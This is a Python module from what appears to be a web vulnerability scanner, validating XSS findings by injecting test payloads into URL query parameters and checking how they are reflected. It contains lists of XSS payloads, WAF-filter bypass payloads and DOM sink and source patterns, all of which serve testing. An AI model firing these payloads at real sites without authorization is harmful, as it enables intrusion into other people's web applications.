"""XSS validation for endpoints with reflection and injection sinks.

Actively validates stored and reflected XSS by testing input reflection
in responses, checking context (script, attribute, HTML body), and
verifying sanitization behavior.
"""

import logging
import re
from typing import Any
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from src.analysis.helpers import (
    endpoint_signature,
    is_auth_flow_endpoint,
    is_low_value_endpoint,
    normalized_confidence,
)
from src.core.models import ValidationResult
from src.execution.validators.validators.shared import to_validation_result

logger = logging.getLogger(__name__)

# XSS test markers (safe, non-executing)
XSS_TEST_MARKERS = [
    "<copilot-xss-test>",
    "copilot_xss_test",
    "xss_test_marker_12345",
]

# Dangerous XSS contexts
DANGEROUS_CONTEXTS = {
    "script_context": 10,
    "event_handler": 9,
    "javascript_uri": 9,
    "svg_onload": 8,
    "iframe_src": 7,
    "object_data": 7,
    "embed_src": 7,
    "form_action": 6,
    "attribute_context": 5,
    "html_body": 4,
    "url_context": 3,
}

# Reflected XSS payloads for active testing
REFLECTED_XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    '"><script>alert(1)</script>',
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "'\"><svg/onload=alert(1)>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    '<video><source onerror="alert(1)">',
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "';alert(1);//",
    '";alert(1);//',
    "</script><script>alert(1)</script>",
]

# WAF bypass payloads
WAF_BYPASS_PAYLOADS = [
    "<scr<script>ipt>alert(1)</scr</script>ipt>",
    '<img src=x onerror="alert(1)">',
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "<svg%0Aonload=alert(1)>",
    "javascript&#58;alert(1)",
    "<img src=x onerror=alert&#40;1&#41;>",
    '"><svg/onload=alert(1)>',
    "';alert(String.fromCharCode(88,83,83))//",
]

# DOM-based XSS indicators
DOM_XSS_SINKS = [
    "document.write(",
    "document.writeln(",
    "innerHTML",
    "outerHTML",
    "insertAdjacentHTML(",
    "eval(",
    "setTimeout(",
    "setInterval(",
    "Function(",
    "location.replace(",
    "location.assign(",
    "location.href=",
    "location.hash=",
    "document.location=",
    "window.location=",
]

DOM_XSS_SOURCES = [
    "location.hash",
    "location.search",
    "location.pathname",
    "document.referrer",
    "document.URL",
    "document.documentURI",
    "window.name",
    "postMessage",
]


def _detect_xss_context(response_body: str, payload: str) -> str:
    """Detect the context in which a payload was reflected.

    Args:
        response_body: The HTTP response body to analyze.
        payload: The XSS payload that was sent.

    Returns:
        Context string (script_context, attribute_context, html_body, url_context, none).
    """
    if not response_body or not payload:
        return "none"

    body_lower = response_body.lower()
    payload_lower = payload.lower()

    if payload_lower not in body_lower:
        return "none"

    payload_pos = body_lower.find(payload_lower)
    context_start = max(0, payload_pos - 100)
    context_end = min(len(body_lower), payload_pos + len(payload_lower) + 100)
    context_snippet = body_lower[context_start:context_end]

    if re.search(r"<script[^>]*>.*" + re.escape(payload_lower), context_snippet, re.DOTALL):
        return "script_context"

    if re.search(r'on\w+\s*=\s*["\']?' + re.escape(payload_lower), context_snippet):
        return "event_handler"

    if re.search(r'["\'][^"\']*' + re.escape(payload_lower), context_snippet):
        return "attribute_context"

    if "javascript:" in payload_lower and payload_lower in context_snippet:
        return "javascript_uri"

    if "<svg" in payload_lower and "onload" in payload_lower:
        return "svg_onload"

    if "<img" in payload_lower and "onerror" in payload_lower:
        return "event_handler"

    if "<iframe" in payload_lower:
        return "iframe_src"

    if "<object" in payload_lower or "<embed" in payload_lower:
        return "object_data"

    return "html_body"


def _check_waf_bypass(response_body: str, payload: str) -> bool:
    """Check if a WAF bypass payload was reflected without filtering.

    Args:
        response_body: The HTTP response body.
        payload: The WAF bypass payload sent.

    Returns:
        True if the payload was reflected unfiltered.
    """
    if not response_body or not payload:
        return False

    payload_lower = payload.lower()
    return payload_lower in response_body.lower()


def _check_dom_xss_indicators(response_body: str) -> list[str]:
    """Check response body for DOM-based XSS sink/source patterns.

    Args:
        response_body: The HTTP response body to analyze.

    Returns:
        List of detected DOM XSS indicators.
    """
    if not response_body:
        return []

    indicators = []

    for sink in DOM_XSS_SINKS:
        if sink.lower() in response_body.lower():
            indicators.append(f"dom_sink:{sink}")

    for source in DOM_XSS_SOURCES:
        if source.lower() in response_body.lower():
            indicators.append(f"dom_source:{source}")

    return indicators


def _active_xss_test(target_url: str, http_client: Any) -> dict[str, Any]:
    """Perform active XSS testing against the target URL.

    Args:
        target_url: The URL to test.
        http_client: HTTP client for making requests.

    Returns:
        Dict with active XSS test results.
    """
    if not http_client:
        return {"status": "skipped", "reason": "no_http_client"}

    parsed = urlparse(target_url)
    query_params = dict(parse_qsl(parsed.query, keep_blank_values=True))
    test_results: list[dict[str, Any]] = []
    reflected_payloads: list[str] = []
    contexts_found: list[str] = []
    waf_bypasses: list[str] = []
    dom_indicators: list[str] = []

    if not query_params:
        return {
            "status": "skipped",
            "reason": "no_query_params",
            "url": target_url,
        }

    for param_name in list(query_params.keys())[:3]:
        original_value = query_params[param_name]

        for payload in REFLECTED_XSS_PAYLOADS[:8]:
            test_params = dict(query_params)
            test_params[param_name] = payload
            new_query = urlencode(test_params)
            test_url = urlunparse(
                (
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment,
                )
            )

            try:
                response = http_client.request(test_url)
                status_code = int(response.get("status_code") or 0)
                body = str(response.get("body", ""))

                context = _detect_xss_context(body, payload)
                if context != "none":
                    reflected_payloads.append(payload)
                    contexts_found.append(context)
                    test_results.append(
                        {
                            "param": param_name,
                            "payload": payload,
                            "reflected": True,
                            "context": context,
                            "status_code": status_code,
                        }
                    )
            except Exception as exc:
                test_results.append(
                    {
                        "param": param_name,
                        "payload": payload,
                        "reflected": False,
                        "error": str(exc),
                    }
                )

        for bypass_payload in WAF_BYPASS_PAYLOADS[:4]:
            test_params = dict(query_params)
            test_params[param_name] = bypass_payload
            new_query = urlencode(test_params)
            test_url = urlunparse(
                (
                    parsed.scheme,
                    parsed.netloc,
                    parsed.path,
                    parsed.params,
                    new_query,
                    parsed.fragment,
                )
            )

            try:
                response = http_client.request(test_url)
                body = str(response.get("body", ""))

                if _check_waf_bypass(body, bypass_payload):
                    waf_bypasses.append(bypass_payload)
                    test_results.append(
                        {
                            "param": param_name,
                            "payload": bypass_payload,
                            "waf_bypass": True,
                        }
                    )
            except Exception as exc:
                logger.debug(
                    "XSS detection failed for %s param %s: %s",
                    target_url,
                    param_name,
                    exc,
                )

        query_params[param_name] = original_value

    if test_results:
        sample_response = http_client.request(target_url)
        body = str(sample_response.get("body", ""))
        dom_indicators = _check_dom_xss_indicators(body)

    unique_contexts = sorted(set(contexts_found))
    reflected_count = len(reflected_payloads)
    bypass_count = len(waf_bypasses)

    if reflected_count > 0:
        status = (
            "confirmed"
            if any(
                c in ("script_context", "event_handler", "javascript_uri") for c in contexts_found
            )
            else "potential"
        )
    elif bypass_count > 0:
        status = "potential"
    else:
        status = "not_reflected"

    return {
        "status": status,
        "url": target_url,
        "test_results": test_results[:20],
        "reflected_payloads": reflected_payloads[:10],
        "contexts_found": unique_contexts,
        "waf_bypasses": waf_bypasses[:5],
        "dom_indicators": dom_indicators[:10],
        "reflected_count": reflected_count,
        "bypass_count": bypass_count,
        "payloads_tested": len(test_results),
    }


from src.core.plugins import register_plugin

VALIDATOR = "validator"


@register_plugin(VALIDATOR, "xss_candidates")
def validate_xss_candidates(
    analysis_results: dict[str, Any],
    callback_context: dict[str, Any] | None = None,
) -> list[dict[str, Any]]:
    """Validate XSS protection on endpoints with input reflection.

    Analyzes results from passive XSS detectors to identify endpoints
    that may be vulnerable to stored or reflected XSS.

    Args:
        analysis_results: Results from passive analysis modules.
        callback_context: Optional callback context with validation state.

    Returns:
        List of XSS validation findings.
    """
    findings: list[dict[str, Any]] = []
    seen_patterns: set[str] = set()

    # Get XSS-related findings from passive analysis
    stored_xss = analysis_results.get("stored_xss_signal_detector", [])
    reflected_xss = analysis_results.get("reflected_xss_probe", [])

    for item in stored_xss + reflected_xss:
        url = str(item.get("url", "")).strip()
        if not url or is_low_value_endpoint(url):
            continue
        endpoint_key = str(item.get("endpoint_key") or endpoint_signature(url))
        if endpoint_key in seen_patterns:
            continue
        seen_patterns.add(endpoint_key)

        xss_signals: list[str] = list(item.get("xss_signals", []))
        signals: list[str] = list(item.get("signals", []))
        score = int(item.get("score", 0))

        # Check for auth flow endpoints (higher risk for stored XSS)
        if is_auth_flow_endpoint(url):
            signals.append("auth_flow_endpoint")
            score += 2

        # Score based on XSS context danger level
        context_score = 0
        for signal in xss_signals:
            if signal in DANGEROUS_CONTEXTS:
                context_score += DANGEROUS_CONTEXTS[signal]
                signals.append(f"dangerous_xss_context:{signal}")

        # Check for user-controlled input
        if item.get("parameter"):
            signals.append(f"input_parameter:{item['parameter']}")
            score += 2

        # Determine validation state
        validation_state = "passive_only"
        if xss_signals and context_score >= 5:
            validation_state = "active_ready"
            score += 4
        elif xss_signals:
            score += 2

        # Calculate confidence
        confidence = normalized_confidence(
            base=0.50,
            score=score + context_score,
            signals=signals,
            cap=0.94,
        )

        # Determine severity
        if context_score >= 8:
            severity = "high"
        elif context_score >= 5:
            severity = "medium"
        else:
            severity = "low"

        findings.append(
            {
                "url": url,
                "endpoint_key": endpoint_key,
                "endpoint_type": str(item.get("endpoint_type", "GENERAL")),
                "score": score + context_score,
                "severity": severity,
                "signals": sorted(set(signals)),
                "xss_signals": sorted(set(xss_signals)),
                "confidence": round(confidence, 2),
                "validation_state": validation_state,
                "context_danger_score": context_score,
                "hint_message": f"XSS signal detected on {url}. Context risk: {context_score}. Verify input sanitization and output encoding.",
            }
        )

    findings.sort(key=lambda x: (-x["score"], -x["confidence"], x["url"]))
    return findings[:50]


def validate(target: dict[str, Any], context: dict[str, Any]) -> ValidationResult:
    """Validate XSS vulnerability with passive analysis and active testing.

    Performs passive analysis of existing responses for XSS indicators,
    then actively sends XSS payloads to identified endpoints to test
    for reflected, stored, and DOM-based XSS.

    Args:
        target: Target dict with url and metadata.
        context: Validation context with analysis_results and http_client.

    Returns:
        ValidationResult with XSS assessment.
    """
    analysis_results = context.get("analysis_results") if isinstance(context, dict) else {}
    analysis_results = analysis_results if isinstance(analysis_results, dict) else {}
    http_client = context.get("http_client") if isinstance(context, dict) else None

    passive_findings = validate_xss_candidates(analysis_results)

    if not passive_findings:
        return to_validation_result(
            {"url": target.get("url", ""), "status": "no_xss_signals"},
            validator="xss",
            category="xss",
        )

    top_finding = passive_findings[0]
    target_url = top_finding.get("url", target.get("url", ""))
    validation_state = top_finding.get("validation_state", "passive_only")

    active_result: dict[str, Any] = {"status": "skipped", "reason": "not_active_ready"}

    if validation_state == "active_ready" and http_client:
        active_result = _active_xss_test(target_url, http_client)

    active_status = active_result.get("status", "skipped")
    reflected_count = active_result.get("reflected_count", 0)
    bypass_count = active_result.get("bypass_count", 0)
    contexts_found = active_result.get("contexts_found", [])
    waf_bypasses = active_result.get("waf_bypasses", [])
    dom_indicators = active_result.get("dom_indicators", [])

    base_confidence = top_finding.get("confidence", 0.50)
    bonuses: list[float] = []

    if active_status == "confirmed":
        bonuses.append(0.25)
    elif active_status == "potential":
        bonuses.append(0.12)
    elif active_status == "not_reflected":
        bonuses.append(-0.15)

    if reflected_count >= 3:
        bonuses.append(0.10)
    elif reflected_count >= 1:
        bonuses.append(0.05)

    if bypass_count > 0:
        bonuses.append(0.08 * min(bypass_count, 3))

    if contexts_found:
        dangerous_contexts = {"script_context", "event_handler", "javascript_uri"}
        if dangerous_contexts & set(contexts_found):
            bonuses.append(0.15)
        bonuses.append(0.03 * min(len(contexts_found), 4))

    if dom_indicators:
        bonuses.append(0.05 * min(len(dom_indicators), 4))

    if validation_state == "active_ready":
        bonuses.append(0.08)

    confidence = round(min(max(base_confidence + sum(bonuses), 0.10), 0.98), 2)

    if active_status == "confirmed":
        final_status = "confirmed"
        severity = "high"
    elif active_status == "potential" or (
        reflected_count > 0 and top_finding.get("context_danger_score", 0) >= 8
    ):
        final_status = "potential"
        severity = "medium"
    elif reflected_count > 0:
        final_status = "potential"
        severity = "low"
    else:
        final_status = "not_confirmed"
        severity = "low"

    edge_case_notes = []
    if active_status == "skipped":
        edge_case_notes.append(
            "Active testing was skipped — no HTTP client or endpoint not active-ready."
        )
    if bypass_count > 0:
        edge_case_notes.append(
            f"WAF bypass payloads reflected ({bypass_count}) — input filtering may be insufficient."
        )
    if dom_indicators:
        edge_case_notes.append(
            f"DOM-based XSS indicators detected ({len(dom_indicators)}) — review client-side code."
        )

    evidence = {
        "passive_signals": top_finding.get("signals", []),
        "xss_signals": top_finding.get("xss_signals", []),
        "context_danger_score": top_finding.get("context_danger_score", 0),
        "active_status": active_status,
        "reflected_count": reflected_count,
        "bypass_count": bypass_count,
        "contexts_found": contexts_found,
        "waf_bypasses": waf_bypasses,
        "dom_indicators": dom_indicators,
        "payloads_tested": active_result.get("payloads_tested", 0),
        "test_results": active_result.get("test_results", [])[:10],
    }

    result_item = {
        "url": target_url,
        "status": final_status,
        "confidence": confidence,
        "severity": severity,
        "validation_state": "active_tested" if active_status != "skipped" else validation_state,
        "signals": top_finding.get("signals", []),
        "evidence": evidence,
        "edge_case_notes": edge_case_notes,
        "hint_message": top_finding.get("hint_message", ""),
    }

    return to_validation_result(result_item, validator="xss", category="xss")
